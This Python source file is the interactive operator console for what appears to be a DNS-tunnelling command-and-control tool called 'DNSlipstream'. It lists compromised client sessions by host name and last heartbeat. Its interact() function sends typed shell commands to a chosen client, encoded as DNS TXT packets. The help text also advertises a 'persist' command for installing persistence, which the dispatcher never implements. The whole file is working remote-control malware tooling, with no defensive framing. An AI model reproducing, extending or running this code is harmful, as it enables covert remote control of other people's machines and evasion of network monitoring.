# cmd/server/cli.py
import sys
import time
from prompt_toolkit import PromptSession
from prompt_toolkit.completion import Completer, Completion
from prompt_toolkit.history import InMemoryHistory


from lib.transport.encoding import encode


# Global state (will be shared with server)
console_buffer = {}
current_session = None
packet_queue = {}
sessions_map = {}
encryption_key = ""
target_domain = ""



class ShellCompleter(Completer):
    """Auto-completion for Shell commands."""
    
    def __init__(self):
        self.commands = {
            'sessions': 'List or interact with sessions',
            'ls': 'Alias for sessions (list sessions)',
            'use': 'Interact with a specific session',
            'save': 'Manually save all sessions',
            'restore': 'Restore sessions from disk',
            'clear': 'Clear saved session data',
            'exit': 'Stop the Shell Server',
            'help': 'Show available commands'
        }
    
    def get_completions(self, document, complete_event):
        """Generate completions based on current input."""
        text = document.text_before_cursor
        
        if not text:
            return
        
        args = text.split()
        
        # Complete commands
        if len(args) <= 1:
            word = args[0] if args else ''
            for cmd, desc in self.commands.items():
                if cmd.startswith(word):
                    yield Completion(cmd, start_position=-len(word), display_meta=desc)
        
        # Complete session IDs for 'sessions' or 'use' commands
        elif len(args) == 2 and args[0] in ['sessions', 'use']:
            word = args[1]
            for client_guid in sessions_map.keys():
                if client_guid.startswith(word):
                    client_info = sessions_map[client_guid]
                    hostname = getattr(client_info, 'hostname', 'unknown')
                    yield Completion(
                        client_guid, 
                        start_position=-len(word),
                        display_meta=hostname
                    )              


def display_sessions():
    """Display all active sessions with detailed information."""
    if not sessions_map:
        print("No active sessions")
        return
    
    print("\n╔══════════════════════════════════════════════════════════════════╗")
    print("║                        Active Sessions                           ║")
    print("╠══════════════════════════════════════════════════════════════════╣")
    print("║ Client ID            │ Hostname            │ Status              ║")
    print("╠══════════════════════════════════════════════════════════════════╣")
    
    now = time.time()
    
    for client_guid, session in sessions_map.items():
        # Calculate time since last heartbeat
        last_seen = int(now - session.heartbeat)
        
        # Determine status
        if current_session == client_guid:
            status = "ACTIVE"
        elif last_seen < 10:
            status = f"IDLE ({last_seen}s)"
        else:
            status = f"STALE ({last_seen}s)"
        
        # Get hostname
        hostname = session.hostname if hasattr(session, 'hostname') else 'unknown'
        
        # Format output
        guid_short = client_guid[:18] + ".." if len(client_guid) > 18 else client_guid
        hostname_short = hostname[:18] + ".." if len(hostname) > 18 else hostname
        
        print(f"║ {guid_short:<20} │ {hostname_short:<19} │ {status:<19} ║")
    
    print("╚══════════════════════════════════════════════════════════════════╝\n")



def interact(session_id: str):
    """
    Interact with a specific session.
    
    Args:
        session_id: The client GUID to interact with
    """
    global current_session
    
    # Validate session exists
    if session_id not in sessions_map:
        print(f"Error: Session {session_id} not found")
        return
    
    # Get session info
    session_info = sessions_map[session_id]
    hostname = getattr(session_info, 'hostname', 'unknown')

    # Show interaction banner
    print(f"\n{'='*60}")
    print(f"  Connected to: {hostname}")
    print(f"  Session ID:   {session_id[:16]}...")
    print(f"  Type 'background' to return to main menu")
    print(f"{'='*60}\n")
    
    # Print buffered console output if available
    if session_id in console_buffer:
        buffer = console_buffer[session_id]
        for line in buffer:
            print(line, end='')
        console_buffer[session_id] = []
    
    current_session = session_id
    
    # Convert hex session id to bytes for encode()
    client_guid = bytes.fromhex(session_id)
    
    session = PromptSession(history=InMemoryHistory())
    
    try:
        while True:
            try:
                line = session.prompt('')
            except KeyboardInterrupt:
                continue
            except EOFError:
                break
            
            if line.strip() == "background":
                print("\nReturning to main menu...")
                current_session = None
                return
            
            if not line.strip():
                continue
            
            # Encode command
            # FIXED: encode() now returns ((init_packet, record_type), [(data_packet, record_type), ...])
            (init_packet, init_type), data_packets = encode(
                (line + "\n").encode(),
                False,          # is_request = False for server->client
                encryption_key,
                target_domain,
                client_guid,
                record_type='TXT'  # Server always uses TXT for now
            )
            
            # Initialize queue if needed
            if session_id not in packet_queue:
                packet_queue[session_id] = []
            
            # Queue init packet (just the packet string, not the tuple)
            packet_queue[session_id].append(init_packet)
            
            # Queue data packets (extract just the packet string from each tuple)
            for packet, record_type in data_packets:
                packet_queue[session_id].append(packet)
    
    except Exception as e:
        print(f"\nError during interaction: {e}")
        import traceback
        traceback.print_exc()
    finally:
        current_session = None



def show_help():
    """Display help information."""
    print("\n╔══════════════════════════════════════════════════════════════════╗")
    print("║                     DNSlipstream Server CLI                      ║")
    print("╠══════════════════════════════════════════════════════════════════╣")
    print("║ Command          │ Description                                   ║")
    print("╠══════════════════════════════════════════════════════════════════╣")
    print("║ sessions         │ List all active sessions                      ║")
    print("║ ls               │ Alias for 'sessions'                          ║")
    print("║ sessions <id>    │ Interact with specific session                ║")
    print("║ use <id>         │ Alias for 'sessions <id>'                     ║")
    print("║ persist <id>     │ Install persistence on specified session      ║")
    print("║ save             │ Manually save all sessions                    ║")
    print("║ restore          │ Restore sessions from disk                    ║")
    print("║ clear            │ Clear saved session data                      ║")
    print("║ help             │ Show this help message                        ║")
    print("║ exit             │ Shutdown the server                           ║")
    print("╠══════════════════════════════════════════════════════════════════╣")
    print("║ During Session:                                                  ║")
    print("║ background       │ Return to main menu (keep session alive)      ║")
    print("╚══════════════════════════════════════════════════════════════════╝\n")



def executor(command: str):
    """
    Execute a Shell command.
    
    Args:
        command: The command string to execute
    """
    args = command.strip().split()
    
    if not args:
        return
    
    cmd = args[0]
    
    if cmd == "exit":
        print("\n[*] Shutting down server...")
        sys.exit(0)
    
    elif cmd == "help":
        show_help()
    
    elif cmd in ["sessions", "ls"]:
        if len(args) == 2:
            # Interact with specific session
            session_id = args[1]
            
            # Try to find by partial match
            matches = [guid for guid in sessions_map.keys() if guid.startswith(session_id)]
            
            if len(matches) == 1:
                interact(matches[0])
            elif len(matches) > 1:
                print(f"Error: Ambiguous session ID. Matches: {len(matches)}")
                for match in matches:
                    hostname = getattr(sessions_map[match], 'hostname', 'unknown')
                    print(f"  {match[:16]}... - {hostname}")
            else:
                print(f"Error: Session '{session_id}' not found")
        else:
            # List all sessions
            display_sessions()
    
    elif cmd == "use":
        if len(args) == 2:
            session_id = args[1]
            
            # Try to find by partial match
            matches = [guid for guid in sessions_map.keys() if guid.startswith(session_id)]
            
            if len(matches) == 1:
                interact(matches[0])
            elif len(matches) > 1:
                print(f"Error: Ambiguous session ID. Matches: {len(matches)}")
                for match in matches:
                    hostname = getattr(sessions_map[match], 'hostname', 'unknown')
                    print(f"  {match[:16]}... - {hostname}")
            else:
                print(f"Error: Session '{session_id}' not found")
        else:
            print("Usage: use <session_id>")
    
    elif cmd == "save":
        # Manually save sessions
        from lib.persistence.session_store import SessionStore
        store = SessionStore()
        success, msg = store.save_sessions(sessions_map, console_buffer, packet_queue)
        print(f"[{'+'  if success else '-'}] {msg}")
    
    elif cmd == "restore":
        # Manually restore sessions
        from lib.persistence.session_store import SessionStore, SessionRecovery
        from cmd.server.serv import ClientInfo
        
        store = SessionStore()
        sessions_data, buffers, queues = store.load_sessions()
        
        if not sessions_data:
            print("[-] No saved sessions found")
        else:
            restored = 0
            for guid, data in sessions_data.items():
                if guid not in sessions_map:
                    sessions_map[guid] = SessionRecovery.restore_session(guid, data, ClientInfo)
                    restored += 1
                    print(f"[+] Restored: {guid[:16]}... ({data['hostname']})")
            
            console_buffer.update(buffers)
            packet_queue.update(queues)
            print(f"\n[+] Restored {restored} sessions")
    
    elif cmd == "clear":
        # Clear saved sessions
        from lib.persistence.session_store import SessionStore
        store = SessionStore()
        if store.clear_sessions():
            print("[+] Cleared all saved sessions")
        else:
            print("[-] Failed to clear sessions")

    else:
        print(f"Unknown command: '{cmd}'")
        print("Type 'help' for available commands")



def run_cli():
    """Run the interactive CLI."""
    completer = ShellCompleter()
    session = PromptSession(
        completer=completer,
        history=InMemoryHistory()
    )
    
    print("\n╔══════════════════════════════════════════════════════════════════╗")
    print("║               DNSlipstream Server - Interactive CLI              ║")
    print("╠══════════════════════════════════════════════════════════════════╣")
    print("║  Type 'help' for available commands                              ║")
    print("║  Type 'sessions' to list active clients                          ║")
    print("║  Type 'use <id>' to interact with a client                       ║")
    print("╚══════════════════════════════════════════════════════════════════╝\n")
    
    while True:
        try:
            command = session.prompt('shell >>> ')
            if command.strip():
                executor(command)
        except KeyboardInterrupt:
            print()  # New line after Ctrl+C
            continue
        except EOFError:
            print("\n[*] Exiting...")
            sys.exit(0)
        except Exception as e:
            print(f"Error: {e}")
            import traceback
            traceback.print_exc()



if __name__ == "__main__":
    run_cli()
